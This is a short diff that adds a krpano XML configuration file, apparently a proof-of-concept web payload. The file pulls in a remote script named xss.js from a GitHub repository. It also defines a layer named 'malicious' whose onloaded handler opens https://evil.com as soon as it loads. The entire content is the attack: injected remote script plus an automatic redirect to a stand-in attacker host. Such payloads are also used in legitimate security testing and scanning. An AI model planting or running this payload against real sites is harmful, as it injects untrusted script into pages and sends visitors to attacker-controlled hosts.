@@ -1,0 +1,7 @@
+<krpano>
+    <include url="https://raw.githubusercontent.com/schooldropout1337/nuclei-templates/refs/heads/main/xss.js" />
+    <layer name="malicious" 
+           type="container" 
+           visible="true" 
+           onloaded="openurl('https://evil.com', _parent);"/>
+</krpano>
